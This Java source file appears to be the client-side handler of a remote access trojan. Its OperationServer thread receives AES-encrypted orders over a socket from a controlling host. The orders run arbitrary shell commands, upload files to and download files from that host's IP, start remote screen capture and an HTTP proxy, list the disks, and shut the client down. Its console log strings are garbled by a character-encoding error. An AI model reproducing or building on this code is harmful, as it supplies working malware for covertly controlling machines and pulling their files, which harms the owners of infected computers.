package tools;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

import common.Message;
import common.MessageType;
import encryption.AESEn;
import file.fileManager;
import file.recevieFile;
import file.sendFile;
import httpProxy.Proxy;
import remote.ImageThread;
import remote.RemoteClient;
import shellCode.shellCode;

public class OperationServer extends Thread{
	private Socket s;
	private String AESPrivateKey;
	private String IP;
	
	public OperationServer(Socket s,String IP,String AESPrivateKey) {
		this.s = s;
		this.IP = IP;
		this.AESPrivateKey = AESPrivateKey;
	}

	public void run() {
		Message message = null;
		Message response;
		while (true) {
			try {
				ObjectOutputStream oos = new ObjectOutputStream(s.getOutputStream());
				ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
				message = (Message) ois.readObject();
				System.out.println("�ͻ��˽��շ������������ݰ�...������:"+message.getMesType());
				if(message.getMesType().equals(MessageType.message_shellcode)) {
			        byte[] decrypt = AESEn.decrypt(message.getContent(), AESPrivateKey);
					String cmd =  new String(decrypt,"utf-8");
					System.out.println("�ͻ����յ������CMDָ��:"+cmd);
					shellCode sc = new shellCode(s);
					sc.useShell(cmd);
				}
				else if(message.getMesType().equals(MessageType.message_upFile)) {
					System.out.println("���յ�����������Ҫ�ϴ��ļ�����...");
					recevieFile r = new recevieFile(IP);
					r.start();
				}
				else if(message.getMesType().equals(MessageType.message_downFile)) {
					System.out.println("���յ�����������Ҫ�����ļ�����...");
					byte[] decrypt = AESEn.decrypt(message.getContent(), AESPrivateKey);
					String path =  new String(decrypt,"utf-8");
					System.out.println("�ͻ����յ������Ҫ���ص��ļ���: "+path);
					String[] format = path.split("\\\\");
					String newPath = "";
					for(int i=0;i<format.length-1;i++) {
						newPath += format[i]+"\\\\";
					}
					newPath += format[format.length-1];
					System.out.println("���ļ�·�������Ϊ: "+path);
					sendFile send = new sendFile(path,IP);
					send.start();
				}
				else if(message.getMesType().equals(MessageType.message_remote)) {
					RemoteClient r = new RemoteClient(IP);
					r.start();
				}
				else if(message.getMesType().equals(MessageType.message_End_remote)) {
					ImageThread imageThread = new ImageThread();
					imageThread.b = false;
				}
				else if(message.getMesType().equals(MessageType.message_start_proxy)) {
					Proxy p = new Proxy();
					p.startProxy();
				}
				else if(message.getMesType().equals(MessageType.message_End_proxy)) {
					Proxy p = new Proxy();
					p.endProxy();
				}

				else if(message.getMesType().equals(MessageType.message_all_End)) {
					Thread t = new Thread();
					t.sleep(100);
					System.exit(0);
				}
				else if(message.getMesType().equals(MessageType.message_diskList_fileManager)) {
					fileManager t = new fileManager();
					String content = t.getDiskList();
					response = new Message();
					System.out.println("�ͻ��˴�ӡ����Ŀ¼��ѯ:"+content);
					response.setMesType(MessageType.message_respondDiskList_fileManager);
					response.setContent(content.getBytes());
					oos.writeObject(response);
				}
				
			} catch (Exception e) {
				e.printStackTrace();
				System.exit(0);
			}
		}
	}

}
